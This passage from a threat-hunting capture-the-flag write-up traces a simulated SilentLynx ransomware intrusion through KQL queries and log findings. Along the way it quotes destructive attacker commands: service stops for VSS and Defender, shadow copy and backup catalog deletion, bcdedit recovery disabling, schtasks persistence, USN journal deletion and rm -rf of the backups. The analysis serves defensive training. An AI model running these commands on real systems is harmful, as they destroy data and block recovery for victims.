**Reference:** This finding was derived from the same query results as Flags 13 and 14.

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 6:03:47 AM - 6:05:46 AM |
| Source Device | azuki-adminpc |
| Payload Location | C:\Windows\Temp\cache\ |
| Payload | silentlynx.exe |

**Analysis:**

The attacker deployed `silentlynx.exe` - the custom JADE SPIDER implant - across all Windows systems in the network. This is the same implant discovered in Part 3 (Flag 7) that was extracted from the `KB5044273-x64.7z` archive.

**Deployment Summary:**

| Target IP | Target System | Payload Deployed |
|-----------|---------------|------------------|
| 10.1.0.102 | Unknown workstation | silentlynx.exe |
| 10.1.0.188 | azuki-fileserver01 | silentlynx.exe |
| 10.1.0.204 | azuki-sl | silentlynx.exe |

**silentlynx.exe Lifecycle:**

| Part | Timestamp | Event |
|------|-----------|-------|
| Part 3 | Nov 25, 4:21:33 AM | Extracted from KB5044273-x64.7z on azuki-adminpc |
| Part 4 | Nov 25, 6:03-6:05 AM | Deployed to all Windows systems via PsExec |
| Part 4 | Nov 27, 5:48 AM | Ransomware encryption triggered |

**Threat Actor Attribution:**

The filename `silentlynx.exe` directly ties this attack to the **JADE SPIDER** threat actor, as "SilentLynx" is a known alias for this group. This matches the ransom note branding: "SilentLynx Security Team".

**MITRE ATT&CK Reference:**
- User Execution: Malicious File (T1204.002)
- Lateral Tool Transfer (T1570)

**Flag Answer:** `silentlynx.exe`

---

### 🔥 PHASE 3: RECOVERY INHIBITION (FLAGS 16-22)

---

### Flag 16: Impact - Shadow Service Stopped

**Objective:** Identify the command used to stop the shadow copy service.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where TimeGenerated >= datetime(2025-11-25)
| where ProcessCommandLine has_any ("vss", "shadow", "volume shadow")
| order by TimeGenerated asc
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
```

<img width="1200" alt="16" src="https://github.com/user-attachments/assets/749ff032-a9b8-4534-8875-17b9a8405954" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 6:04:53 AM |
| Device | azuki-adminpc |
| Account | yuki.tanaka |
| Command | `"net" stop VSS /y` |

**Analysis:**

The attacker used `net stop VSS /y` to stop the Volume Shadow Copy Service (VSS) on Windows systems. This service creates point-in-time snapshots that could be used for file recovery, so disabling it is a critical step before ransomware encryption.

**VSS Stop Sequence Across Systems:**

| Timestamp | Device | Account | Command |
|-----------|--------|---------|---------|
| 6:04:53 AM | azuki-adminpc | yuki.tanaka | `"net" stop VSS /y` |
| 6:04:53 AM | azuki-adminpc | yuki.tanaka | `net1 stop VSS /y` |
| 6:07:03 AM | azuki-sl | kenji.sato | `"net" stop VSS /y` |
| 6:07:03 AM | azuki-sl | kenji.sato | `net1 stop VSS /y` |

**Command Breakdown:**

| Argument | Purpose |
|----------|---------|
| `net stop` | Stop a Windows service |
| `VSS` | Volume Shadow Copy Service |
| `/y` | Suppress confirmation prompt (auto-yes) |

**Note on net.exe vs net1.exe:**

When `net.exe` is executed, Windows often spawns `net1.exe` as the actual worker process. Both entries represent the same command execution - this is normal Windows behavior, not duplicate commands.

**Timeline Context:**

| Timestamp | Event |
|-----------|-------|
| 6:03:47 AM | PsExec deployment to 10.1.0.102 |
| 6:04:40 AM | PsExec deployment to azuki-fileserver01 |
| 6:04:53 AM | VSS stopped on azuki-adminpc |
| 6:05:46 AM | PsExec deployment to azuki-sl |
| 6:07:03 AM | VSS stopped on azuki-sl |

The attacker stopped VSS on each system shortly after deploying the silentlynx.exe implant.

**MITRE ATT&CK Reference:**
- Inhibit System Recovery (T1490)
- Service Stop (T1489)

**Flag Answer:** `"net" stop VSS /y`

---

### Flag 17: Impact - Backup Engine Stopped

**Objective:** Identify the command used to stop the backup engine.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where TimeGenerated >= datetime(2025-11-25)
| where FileName in ("net.exe", "net1.exe")
| where ProcessCommandLine has "stop"
| order by TimeGenerated asc
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
```

<img width="1200" alt="17" src="https://github.com/user-attachments/assets/cab514bb-d881-4a62-888c-00bda89f793a" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 6:07:03 AM |
| Device | azuki-sl |
| Account | kenji.sato |
| Command | `"net" stop wbengine /y` |

**Analysis:**

The attacker used `net stop wbengine /y` to stop the Windows Backup Engine service. This service is responsible for performing backup and recovery operations in Windows.

The query results reveal a comprehensive service disruption campaign targeting multiple security and recovery services:

**Services Stopped on azuki-adminpc (6:04 AM):**

| Timestamp | Service | Purpose |
|-----------|---------|---------|
| 6:04:53 AM | VSS | Volume Shadow Copy Service |
| 6:04:55 AM | wscsvc | Windows Security Center |
| 6:04:56 AM | WdNisSvc | Windows Defender Network Inspection |

**Services Stopped on azuki-sl (6:07 AM):**

| Timestamp | Service | Purpose |
|-----------|---------|---------|
| 6:07:03 AM | VSS | Volume Shadow Copy Service |
| 6:07:03 AM | wbengine | Windows Backup Engine |
| 6:07:04 AM | SDRSVC | Windows Backup (System Restore) |
| 6:07:05 AM | WinDefend | Windows Defender Antivirus |
| 6:07:05 AM | wscsvc | Windows Security Center |
| 6:07:06 AM | WdNisSvc | Windows Defender Network Inspection |

**Service Categories Targeted:**

| Category | Services | Purpose |
|----------|----------|---------|
| Backup/Recovery | VSS, wbengine, SDRSVC | Prevent file recovery |
| Security/AV | WinDefend, WdNisSvc, wscsvc | Disable security defenses |

The attacker systematically disabled both recovery options and security services to ensure successful ransomware deployment without detection or interruption.

**MITRE ATT&CK Reference:**
- Inhibit System Recovery (T1490)
- Service Stop (T1489)
- Impair Defenses: Disable or Modify Tools (T1562.001)

**Flag Answer:** `"net" stop wbengine /y`

---

### Flag 18: Defense Evasion - Process Termination

**Objective:** Identify the command used to terminate processes to unlock files.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where TimeGenerated >= datetime(2025-11-25)
| where ProcessCommandLine has_any ("taskkill", "Stop-Process", "kill")
| order by TimeGenerated asc
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
```

<img width="1200" alt="18" src="https://github.com/user-attachments/assets/06b8c6bd-7eef-4615-b021-0f4f11591ef2" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 6:04:57 AM |
| Device | azuki-adminpc |
| Account | yuki.tanaka |
| Command | `"taskkill" /F /IM sqlservr.exe` |

**Analysis:**

The attacker used `taskkill` with `/F` (force) and `/IM` (image name) flags to terminate processes that could lock files and prevent successful encryption.

**Command Breakdown:**

| Argument | Purpose |
|----------|---------|
| `/F` | Force termination (no graceful shutdown) |
| `/IM` | Specify process by image name |

**Processes Terminated:**

The results reveal two waves of process termination:

**Wave 1 - Security Processes (5:31 AM on azuki-adminpc):**

| Process | Purpose |
|---------|---------|
| MsMpEng.exe | Windows Defender Antimalware Service |
| MpCmdRun.exe | Windows Defender Command Line Utility |
| NisSrv.exe | Windows Defender Network Inspection Service |

**Wave 2 - File-Locking Processes (6:04-6:07 AM on both systems):**

| Process | Category | Purpose |
|---------|----------|---------|
| sqlservr.exe | Database | SQL Server - locks .mdf/.ldf files |
| mysql.exe | Database | MySQL - locks database files |
| oracle.exe | Database | Oracle DB - locks datafiles |
| postgres.exe | Database | PostgreSQL - locks database files |
| mongodb.exe | Database | MongoDB - locks data files |
| outlook.exe | Office | Outlook - locks .pst/.ost files |
| excel.exe | Office | Excel - locks .xlsx files |
| winword.exe | Office | Word - locks .docx files |

**Timeline:**

| Timestamp | Device | Target Processes |
|-----------|--------|------------------|
| 5:31:11 AM | azuki-adminpc | Security (Defender) |
| 6:04:57 AM | azuki-adminpc | Databases & Office |
| 6:07:07 AM | azuki-sl | Databases & Office |

The attacker first disabled security processes, then later terminated database and Office applications to ensure all files could be encrypted without being locked by running processes.

**MITRE ATT&CK Reference:**
- Impair Defenses: Disable or Modify Tools (T1562.001)
- Service Stop (T1489)

**Flag Answer:** `"taskkill" /F /IM sqlservr.exe`

---

### Flag 19: Impact - Recovery Point Deletion

**Objective:** Identify the command used to delete recovery points.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where TimeGenerated >= datetime(2025-11-25)
| where ProcessCommandLine has_any ("vssadmin", "shadowcopy", "wbadmin", "delete shadows", "delete catalog")
| order by TimeGenerated asc
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
```

<img width="1200" alt="19 20 22" src="https://github.com/user-attachments/assets/6af050e4-8265-4bdf-8d18-8b4078bfd3c2" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 5:58:55 AM |
| Device | azuki-adminpc |
| Account | yuki.tanaka |
| Command | `"vssadmin.exe" delete shadows /all /quiet` |

**Analysis:**

The attacker used `vssadmin.exe delete shadows /all /quiet` to delete all Volume Shadow Copies, eliminating recovery points that could be used to restore encrypted files.

**Command Breakdown:**

| Argument | Purpose |
|----------|---------|
| `delete shadows` | Delete shadow copies |
| `/all` | Delete all shadow copies on all volumes |
| `/quiet` | Suppress confirmation prompts |

**Recovery Inhibition Techniques Used:**

| Timestamp | Device | Command | Purpose |
|-----------|--------|---------|---------|
| 5:58:55 AM | azuki-adminpc | `vssadmin.exe delete shadows /all /quiet` | Delete all shadow copies |
| 5:59:56 AM | azuki-adminpc | `vssadmin.exe resize shadowstorage /for=C: /on=C: /maxsize=401MB` | Limit shadow storage (prevent new shadows) |
| 6:00:11 AM | azuki-adminpc | `vssadmin.exe list shadows` | Verify deletion |
| 6:04:59 AM | azuki-adminpc | `vssadmin delete shadows /all /quiet` | Delete shadows again |
| 6:04:59 AM | azuki-adminpc | `wbadmin delete catalog -quiet` | Delete backup catalog |
| 6:05:00 AM | azuki-adminpc | `vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB` | Limit shadow storage |
| 6:07:08 AM | azuki-sl | `vssadmin delete shadows /all /quiet` | Delete all shadow copies |
| 6:07:08 AM | azuki-sl | `wmic shadowcopy delete /nointeractive` | WMI shadow copy deletion |
| 6:07:09 AM | azuki-sl | `wbadmin delete catalog -quiet` | Delete backup catalog |
| 6:07:09 AM | azuki-sl | `vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB` | Limit shadow storage |

**Multiple Deletion Methods:**

The attacker used multiple methods to ensure that shadow copies are eliminated:

| Method | Tool | Command |
|--------|------|---------|
| VSS Admin | vssadmin.exe | `delete shadows /all /quiet` |
| WMI | wmic.exe | `shadowcopy delete /nointeractive` |
| Backup Catalog | wbadmin.exe | `delete catalog -quiet` |
| Storage Limit | vssadmin.exe | `resize shadowstorage /maxsize=401MB` |

This redundant approach ensures that even if one method fails, others will succeed in eliminating recovery options.

**MITRE ATT&CK Reference:**
- Inhibit System Recovery (T1490)

**Flag Answer:** `"vssadmin.exe" delete shadows /all /quiet`

---

### Flag 20: Impact - Storage Limitation

**Objective:** Identify the command used to limit recovery storage.

**Reference:** This finding was derived from the same query results as Flag 19.

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 5:59:56 AM |
| Device | azuki-adminpc |
| Account | yuki.tanaka |
| Command | `"vssadmin.exe" resize shadowstorage /for=C: /on=C: /maxsize=401MB` |

**Analysis:**

The attacker used `vssadmin.exe resize shadowstorage` to severely limit the storage space available for shadow copies. This prevents new recovery points from being created even after the initial shadow copies are deleted.

**Command Breakdown:**

| Argument | Purpose |
|----------|---------|
| `resize shadowstorage` | Modify shadow copy storage allocation |
| `/for=C:` | Target volume (C: drive) |
| `/on=C:` | Storage location for shadows |
| `/maxsize=401MB` | Maximum storage size (severely limited) |

**Why 401MB?**

Setting the shadow storage to only 401MB effectively prevents any useful shadow copies from being created:
- A single shadow copy of a typical Windows system requires several gigabytes
- 401MB is insufficient to store even one complete recovery point
- Any attempt to create new shadows will fail due to insufficient space

**Storage Limitation Across Systems:**

| Timestamp | Device | Command |
|-----------|--------|---------|
| 5:59:56 AM | azuki-adminpc | `"vssadmin.exe" resize shadowstorage /for=C: /on=C: /maxsize=401MB` |
| 6:05:00 AM | azuki-adminpc | `"vssadmin" resize shadowstorage /for=C: /on=C: /maxsize=401MB` |
| 6:07:09 AM | azuki-sl | `"vssadmin" resize shadowstorage /for=C: /on=C: /maxsize=401MB` |

**Defense-in-Depth Attack Strategy:**

The attacker employed multiple techniques to ensure recovery is impossible:

| Step | Action | Effect |
|------|--------|--------|
| 1 | Delete existing shadows | Remove current recovery points |
| 2 | Limit shadow storage | Prevent new recovery points |
| 3 | Delete backup catalog | Remove backup history |
| 4 | Stop VSS service | Disable shadow copy service |

This layered approach ensures that even if administrators attempt to restore the system, no recovery options exist.

**MITRE ATT&CK Reference:**
- Inhibit System Recovery (T1490)

**Flag Answer:** `"vssadmin.exe" resize shadowstorage /for=C: /on=C: /maxsize=401MB`

---

### Flag 21: Impact - Recovery Disabled

**Objective:** Identify the command used to disable system recovery.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where TimeGenerated >= datetime(2025-11-25)
| where ProcessCommandLine has_any ("bcdedit", "recoveryenabled", "bootstatuspolicy", "reagentc")
| order by TimeGenerated asc
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
```

<img width="1200" alt="21" src="https://github.com/user-attachments/assets/7a8f0f80-ed90-4c90-9c0c-811b553a11c7" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 6:04:59 AM |
| Device | azuki-adminpc |
| Account | yuki.tanaka |
| Command | `"bcdedit" /set {default} recoveryenabled No` |

**Analysis:**

The attacker used `bcdedit` to disable Windows Recovery Environment, preventing the system from automatically repairing itself after corruption or offering recovery options at boot.

**Command Breakdown:**

| Argument | Purpose |
|----------|---------|
| `/set` | Modify boot configuration entry |
| `{default}` | Target the default boot entry |
| `recoveryenabled No` | Disable Windows Recovery Environment |

**Recovery Disabled Across Systems:**

| Timestamp | Device | Command |
|-----------|--------|---------|
| 5:59:04 AM | azuki-adminpc | `"bcdedit.exe" /set -encodedCommand ZABlAGYAYQB1AGwAdAA= recoveryenabled No ...` |
| 6:04:59 AM | azuki-adminpc | `"bcdedit" /set {default} recoveryenabled No` |
| 6:07:08 AM | azuki-sl | `"bcdedit" /set {default} recoveryenabled No` |

**Interesting Observation:**

The first command (5:59:04 AM) includes `-encodedCommand` and Base64-encoded data (`ZABlAGYAYQB1AGwAdAA=`), which decodes to `default`. This appears to be an obfuscated version of the same command, possibly from an earlier test or automated script.

**Impact of Disabled Recovery:**

With recovery disabled:
- Windows will not offer the "Repair your computer" option at boot
- Automatic Startup Repair is disabled
- System restore points cannot be accessed via the recovery environment
- Users cannot boot into Windows Recovery Environment (WinRE)

**Complete Recovery Inhibition Summary:**

| Technique | Command | Effect |
|-----------|---------|--------|
| Delete shadow copies | `vssadmin delete shadows /all /quiet` | Remove existing recovery points |
| Limit shadow storage | `vssadmin resize shadowstorage /maxsize=401MB` | Prevent new recovery points |
| Delete backup catalog | `wbadmin delete catalog -quiet` | Remove backup history |
| WMI shadow deletion | `wmic shadowcopy delete /nointeractive` | Redundant shadow removal |
| Disable recovery | `bcdedit /set {default} recoveryenabled No` | Disable Windows Recovery Environment |

**MITRE ATT&CK Reference:**
- Inhibit System Recovery (T1490)

**Flag Answer:** `"bcdedit" /set {default} recoveryenabled No`

---

### Flag 22: Impact - Catalog Deletion

**Objective:** Identify the command used to delete the backup catalogue.

**Reference:** This finding was derived from the same query results as Flag 19.

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 6:04:59 AM |
| Device | azuki-adminpc |
| Account | yuki.tanaka |
| Command | `"wbadmin" delete catalog -quiet` |

**Analysis:**

The attacker used `wbadmin delete catalog -quiet` to delete the Windows Backup catalog, which tracks all available backup versions and restore points.

**Command Breakdown:**

| Argument | Purpose |
|----------|---------|
| `delete catalog` | Delete the backup catalog |
| `-quiet` | Suppress confirmation prompts |

**Catalog Deletion Across Systems:**

| Timestamp | Device | Command |
|-----------|--------|---------|
| 6:04:59 AM | azuki-adminpc | `"wbadmin" delete catalog -quiet` |
| 6:07:09 AM | azuki-sl | `"wbadmin" delete catalog -quiet` |

**Impact of Catalog Deletion:**

The Windows Backup catalog contains:
- List of all backup versions
- Backup locations and timestamps
- File and folder inclusion/exclusion settings
- System state backup history

Without the catalog:
- Windows cannot locate or list existing backups
- Restore operations fail even if backup files exist
- Administrators lose visibility into backup history
- Recovery requires manual reconstruction of backup locations

**Complete Recovery Inhibition Attack Chain:**

| Step | Timestamp | Command | Purpose |
|------|-----------|---------|---------|
| 1 | 5:58:55 AM | `vssadmin delete shadows /all /quiet` | Delete shadow copies |
| 2 | 5:59:56 AM | `vssadmin resize shadowstorage /maxsize=401MB` | Limit shadow storage |
| 3 | 6:04:59 AM | `bcdedit /set {default} recoveryenabled No` | Disable recovery environment |
| 4 | 6:04:59 AM | `wbadmin delete catalog -quiet` | Delete backup catalog |
| 5 | 6:07:08 AM | `wmic shadowcopy delete /nointeractive` | WMI shadow deletion |

The attacker systematically eliminated every possible recovery option before deploying the ransomware encryption.

**MITRE ATT&CK Reference:**
- Inhibit System Recovery (T1490)

**Flag Answer:** `"wbadmin" delete catalog -quiet`

---

### 🔒 PHASE 4: PERSISTENCE (FLAGS 23-24)

---

### Flag 23: Persistence - Registry Autorun

**Objective:** Identify the registry value used to establish persistence.

**Query Used:**
```kql
DeviceRegistryEvents
| where DeviceName contains "azuki"
| where TimeGenerated >= datetime(2025-11-25)
| where RegistryKey has_any ("Run", "RunOnce", "Startup")
| order by TimeGenerated asc
| project TimeGenerated, DeviceName, ActionType, RegistryKey, RegistryValueName, RegistryValueData
```

<img width="1200" alt="23" src="https://github.com/user-attachments/assets/162f015f-777f-49b7-ba47-72b341aa50f6" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 6:05:01 AM |
| Device | azuki-adminpc |
| Registry Key | HKEY_CURRENT_USER\...\Software\Microsoft\Windows\CurrentVersion\Run |
| Registry Value Name | WindowsSecurityHealth |
| Registry Value Data | C:\Windows\Temp\cache\silentlynx.exe |

**Analysis:**

The attacker created registry Run keys to ensure their malware persists across system reboots. The value name `WindowsSecurityHealth` is designed to mimic legitimate Windows security components, making it less suspicious during casual inspection.

**Persistence Mechanisms Established:**

| Timestamp | Device | Value Name | Payload |
|-----------|--------|------------|---------|
| 5:36:33 AM | azuki-adminpc | SystemHealthMonitor | meterpreter.exe |
| 6:05:01 AM | azuki-adminpc | WindowsSecurityHealth | silentlynx.exe |
| 6:07:09 AM | azuki-sl | WindowsSecurityHealth | silentlynx.exe |

**Persistence Naming Strategy:**

| Value Name | Mimics | Actual Payload |
|------------|--------|----------------|
| SystemHealthMonitor | Windows health monitoring | Meterpreter C2 beacon |
| WindowsSecurityHealth | Windows Security Center | SilentLynx ransomware |

Both names are crafted to appear legitimate:
- `SystemHealthMonitor` - Sounds like a Windows diagnostic tool
- `WindowsSecurityHealth` - Mimics Windows Security/Defender components

**Registry Key Location:**

The `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run` key ensures:
- Programs execute automatically when the user logs in
- No administrator privileges required to set
- Survives system reboots
- Executes in the user context

**MITRE ATT&CK Reference:**
- Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001)

**Flag Answer:** `WindowsSecurityHealth`

---

### Flag 24: Persistence - Scheduled Execution

**Objective:** Identify the scheduled task created for persistence.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where TimeGenerated >= datetime(2025-11-25)
| where ProcessCommandLine has_any ("schtasks", "Register-ScheduledTask", "/create")
| order by TimeGenerated asc
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
```

<img width="1200" alt="24" src="https://github.com/user-attachments/assets/5a925549-027e-4ae6-89d1-311e97b78d1b" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 6:05:01 AM |
| Device | azuki-adminpc |
| Account | yuki.tanaka |
| Task Path | Microsoft\Windows\Security\SecurityHealthService |
| Command | `"schtasks" /create /tn "Microsoft\Windows\Security\SecurityHealthService" /tr "C:\Windows\Temp\cache\silentlynx.exe" /sc onlogon /rl highest /f` |

**Analysis:**

The attacker created a scheduled task disguised as a legitimate Windows security service to ensure the persistent execution of the `silentlynx.exe` malware.

**Command Breakdown:**

| Argument | Purpose |
|----------|---------|
| `/create` | Create a new scheduled task |
| `/tn "Microsoft\Windows\Security\SecurityHealthService"` | Task name (mimics Windows Security) |
| `/tr "C:\Windows\Temp\cache\silentlynx.exe"` | Task to run (malware payload) |
| `/sc onlogon` | Trigger: Run when any user logs on |
| `/rl highest` | Run level: Highest privileges available |
| `/f` | Force creation (overwrite if exists) |

**Scheduled Tasks Created:**

| Timestamp | Device | Task Path | Payload |
|-----------|--------|-----------|---------|
| 6:05:01 AM | azuki-adminpc | Microsoft\Windows\Security\SecurityHealthService | silentlynx.exe |
| 6:07:09 AM | azuki-sl | Microsoft\Windows\Security\SecurityHealthService | silentlynx.exe |

**Persistence Strategy:**

The attacker established multiple persistence mechanisms:

| Mechanism | Location/Name | Trigger |
|-----------|---------------|---------|
| Registry Run Key | WindowsSecurityHealth | User logon |
| Scheduled Task | Microsoft\Windows\Security\SecurityHealthService | User logon |

Both mechanisms:
- Use names mimicking legitimate Windows security components
- Execute `silentlynx.exe` payload
- Trigger on user logon
- Ensure malware survives reboots

**Defense Evasion Techniques:**

| Technique | Implementation |
|-----------|----------------|
| Masquerading | Task path placed under `Microsoft\Windows\Security\` |
| Naming Convention | `SecurityHealthService` mimics Windows Defender |
| Location | Stored in a legitimate Windows task scheduler location |

**MITRE ATT&CK Reference:**
- Scheduled Task/Job: Scheduled Task (T1053.005)

**Flag Answer:** `Microsoft\Windows\Security\SecurityHealthService`

---

### 🧹 PHASE 5: ANTI-FORENSICS (FLAG 25)

---

### Flag 25: Defense Evasion - Journal Deletion

**Objective:** Identify the command used to delete forensic evidence.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where TimeGenerated >= datetime(2025-11-25)
| where FileName == "fsutil.exe"
| order by TimeGenerated asc
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
```

<img width="1200"" alt="25" src="https://github.com/user-attachments/assets/6b3e1426-ea9d-49e9-82aa-e1ebce52b9b9" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 6:10:04 AM |
| Device | azuki-adminpc |
| Account | yuki.tanaka |
| Command | `"fsutil.exe" usn deletejournal /D C:` |

**Analysis:**

The attacker used `fsutil.exe usn deletejournal` to delete the NTFS USN (Update Sequence Number) Journal, destroying valuable forensic evidence of file system changes.

**Command Breakdown:**

| Argument | Purpose |
|----------|---------|
| `usn` | USN journal operations |
| `deletejournal` | Delete the journal |
| `/D` | Delete and disable the journal |
| `C:` | Target volume (C: drive) |

**What is the USN Journal?**

The USN Journal is an NTFS feature that maintains a record of all changes made to files and directories on a volume:
- File creations
- File deletions
- File modifications
- File renames
- Attribute changes

**Forensic Impact:**

By deleting the USN Journal, the attacker destroys evidence of:

| Evidence Type | Lost Information |
|---------------|------------------|
| Malware deployment | When silentlynx.exe was created |
| File modifications | Which files were encrypted |
| File deletions | Backup files that were deleted |
| Tool staging | When attack tools were placed |
| Timeline reconstruction | Sequence of attacker activities |

**Complete Anti-Forensics & Recovery Inhibition Timeline:**

| Timestamp | Command | Purpose |
|-----------|---------|---------|
| 5:58:55 AM | `vssadmin delete shadows /all /quiet` | Delete shadow copies |
| 5:59:04 AM | `bcdedit /set {default} recoveryenabled No` | Disable recovery |
| 5:59:56 AM | `vssadmin resize shadowstorage /maxsize=401MB` | Limit shadow storage |
| 6:04:59 AM | `wbadmin delete catalog -quiet` | Delete backup catalog |
| 6:07:08 AM | `wmic shadowcopy delete /nointeractive` | WMI shadow deletion |
| 6:10:04 AM | `fsutil usn deletejournal /D C:` | Delete forensic journal |

This was the final step in the attacker's preparation before ransomware encryption, ensuring that forensic investigators would have limited evidence to analyze.

**MITRE ATT&CK Reference:**
- Indicator Removal on Host: File Deletion (T1070.004)

**Flag Answer:** `"fsutil.exe" usn deletejournal /D C:`

---

### 💀 PHASE 6: RANSOMWARE SUCCESS (FLAG 26)

---

### Flag 26: Impact - Ransom Note

**Objective:** Identify the ransom note filename.

**Query Used:**
```kql
DeviceFileEvents
| where DeviceName contains "azuki"
| where TimeGenerated >= datetime(2025-11-25)
| where FileName has_any ("README", "DECRYPT", "RECOVER", "RESTORE", "ransom", "note", "lynx")
| where FileName endswith ".txt"
| order by TimeGenerated asc
| project TimeGenerated, DeviceName, ActionType, FileName, FolderPath
```

<img width="1200" alt="26" src="https://github.com/user-attachments/assets/e6af7d61-7c20-4a18-a718-9cf29564e068" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 6:05:01 AM |
| Device | azuki-adminpc |
| Filename | SILENTLYNX_README.txt |

**Analysis:**

The attacker dropped `SILENTLYNX_README.txt` ransom notes across multiple systems in user-accessible locations to ensure victims see the ransom demands.

**Ransom Note Distribution:**

| Timestamp | Device | Location |
|-----------|--------|----------|
| 6:05:01 AM | azuki-adminpc | C:\Users\yuki.tanaka\Desktop\ |
| 6:05:01 AM | azuki-adminpc | C:\Users\yuki.tanaka\Documents\ |
| 6:07:09 AM | azuki-sl | C:\Users\kenji.sato\Desktop\ |
| 6:07:09 AM | azuki-sl | C:\Users\kenji.sato\Documents\ |

**Strategic Placement:**

The ransom notes were placed in:
- **Desktop** - Immediately visible when the user logs in
- **Documents** - Visible when accessing files

This ensures victims cannot miss the ransom demands regardless of which folder they access first.

**Ransom Note Details (from incident brief):**

| Field | Value |
|-------|-------|
| Threat Actor | SilentLynx Security Team |
| Affiliate ID | SL-AFF-2847 |
| Victim Key | AZUKI-BC844-1127 |
| Encryption | AES-256-GCM |
| File Extension | .lynx |
| Files Encrypted | 847,293 |
| Ransom Demand | $850,000 USD in Monero |
| Deadline | 72 hours |

**Complete Attack Timeline:**

| Timestamp | Event |
|-----------|-------|
| Nov 25, 5:39 AM | SSH to backup server |
| Nov 25, 5:47 AM | Backup destruction |
| Nov 25, 5:58 AM | Shadow copy deletion begins |
| Nov 25, 6:03 AM | PsExec deployment begins |
| Nov 25, 6:05 AM | Ransom note dropped (azuki-adminpc) |
| Nov 25, 6:07 AM | Ransom note dropped (azuki-sl) |
| Nov 25, 6:10 AM | USN journal deleted |
| Nov 27, 5:48 AM | Encryption completed |

**MITRE ATT&CK Reference:**
- Data Encrypted for Impact (T1486)

**Flag Answer:** `SILENTLYNX_README.txt`

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|--------|-----------|-----|----------|
| Lateral Movement | Remote Services: SSH | T1021.004 | SSH from azuki-adminpc to azuki-backupsrv |
| Lateral Movement | Remote Services: SMB/Windows Admin Shares | T1021.002 | PsExec deployment |
| Credential Access | Valid Accounts: Domain Accounts | T1078.002 | backup-admin, kenji.sato, fileadmin |
| Credential Access | Unsecured Credentials: Credentials In Files | T1552.001 | all-credentials.txt |
| Discovery | File and Directory Discovery | T1083 | ls, find commands on backup server |
| Discovery | Account Discovery: Local Account | T1087.001 | cat /etc/passwd |
| Command and Control | Ingress Tool Transfer | T1105 | curl download of destroy.7z |
| Impact | Data Destruction | T1485 | rm -rf /backups/ |
| Impact | Service Stop | T1489 | systemctl stop/disable cron, net stop services |
| Impact | Inhibit System Recovery | T1490 | vssadmin, bcdedit, wbadmin commands |
| Impact | Data Encrypted for Impact | T1486 | SilentLynx ransomware encryption |
| Defense Evasion | Impair Defenses: Disable or Modify Tools | T1562.001 | Stopped Defender, killed security processes |
| Defense Evasion | Indicator Removal on Host: File Deletion | T1070.004 | fsutil usn deletejournal |
| Persistence | Boot or Logon Autostart Execution: Registry Run Keys | T1547.001 | WindowsSecurityHealth registry key |
| Persistence | Scheduled Task/Job: Scheduled Task | T1053.005 | SecurityHealthService scheduled task |
| Execution | User Execution: Malicious File | T1204.002 | silentlynx.exe deployment |
| Lateral Movement | Lateral Tool Transfer | T1570 | PsExec copy of silentlynx.exe |

---

## CEO Questions Answered

### 1. How did they get to our backup infrastructure?

The attacker used SSH from the compromised CEO admin PC (azuki-adminpc) to access the Linux backup server (azuki-backupsrv) using the `backup-admin` account. The credentials were likely obtained from:
- The KeePass database exfiltrated in Part 3
- The `all-credentials.txt` file was discovered on the backup server itself

**Command:** `"ssh.exe" backup-admin@10.1.0.189`

### 2. What exactly did they destroy?

The attacker executed `rm -rf` to delete ALL backup directories:
- /backups/archives
- /backups/azuki-adminpc
- /backups/azuki-fileserver
- /backups/azuki-logisticspc
- /backups/config-backups
- /backups/configs
- /backups/daily
- /backups/database-backups
- /backups/databases
- /backups/fileserver
- /backups/logs
- /backups/monthly
- /backups/weekly
- /backups/workstations

They also stopped and disabled the cron service to prevent any scheduled backup jobs from running.

### 3. How did the ransomware spread so fast?

The attacker used **PsExec64.exe** to remotely deploy `silentlynx.exe` to all Windows systems simultaneously:
- Used credentials stolen throughout the intrusion (kenji.sato, fileadmin)
- Copied and executed the ransomware on each target
- Completed deployment to 3 systems in under 2 minutes

### 4. Can we recover?

**Unfortunately, recovery options are extremely limited:**

| Recovery Method | Status | Reason |
|-----------------|--------|--------|
| Linux Backups | Destroyed | rm -rf /backups/ |
| Shadow Copies | Deleted | vssadmin delete shadows /all |
| Windows Backup | Disabled | wbadmin delete catalog |
| System Recovery | Disabled | bcdedit recoveryenabled No |
| Forensic Evidence | Limited | USN journal deleted |

**Possible Recovery Options:**
1. Offline/air-gapped backups (if they exist)
2. Cloud backups not connected to the network
3. Third-party backup services
4. Pay the ransom (not recommended)

---

## Recommendations

